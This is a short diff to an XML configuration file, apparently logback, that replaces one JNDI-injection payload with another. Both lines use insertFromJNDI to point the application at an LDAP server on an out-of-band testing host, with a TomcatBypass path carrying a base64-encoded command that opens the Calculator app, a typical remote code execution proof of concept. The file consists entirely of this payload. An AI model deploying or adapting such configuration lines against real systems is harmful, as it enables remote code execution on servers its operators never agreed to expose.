@@ -1,3 +1,3 @@
 <configuration>
-    <insertFromJNDI env-entry-name="ldap://xz082oeqb2oskxfa92fj7q1noeu8ix.oastify.com:1389/TomcatBypass/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9y" as="appName" />
+    <insertFromJNDI env-entry-name="ldap://4inh7pwacdbk9jfo2n7yio6fo6u1iq.burpcollaborator.net:1389/TomcatBypass/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9y" as="appName" />
 </configuration>
